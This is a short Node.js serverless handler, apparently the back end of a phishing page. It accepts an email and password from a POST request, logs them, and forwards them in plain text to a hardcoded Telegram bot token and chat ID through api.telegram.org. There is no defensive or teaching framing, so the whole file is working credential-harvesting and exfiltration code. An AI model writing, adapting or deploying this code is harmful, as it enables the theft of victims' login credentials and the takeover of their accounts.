import fetch from 'node-fetch';

export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            const { email, password } = req.body;
            // Log received credentials
            console.log('Received credentials:', { email, password });

            // Send credentials to Telegram bot
            const telegramBotToken = '7828349055:AAFYs91viPZS8pXSO5GmZj1y02LIZhMmPAc'; // New bot token
            const chatId = '7329638940'; // Your chat ID
            const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;

            console.log('Sending message to Telegram:', telegramUrl);
            const response = await fetch(telegramUrl);
            const result = await response.json();

            console.log('Telegram API response:', result);
            if (!response.ok) {
                throw new Error(`Telegram API error: ${result.description}`);
            }

            res.status(200).json({ success: true });
        } catch (error) {
            console.error('Error in submit.js:', error.message);
            res.status(500).json({ error: 'Failed to process request' });
        }
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}
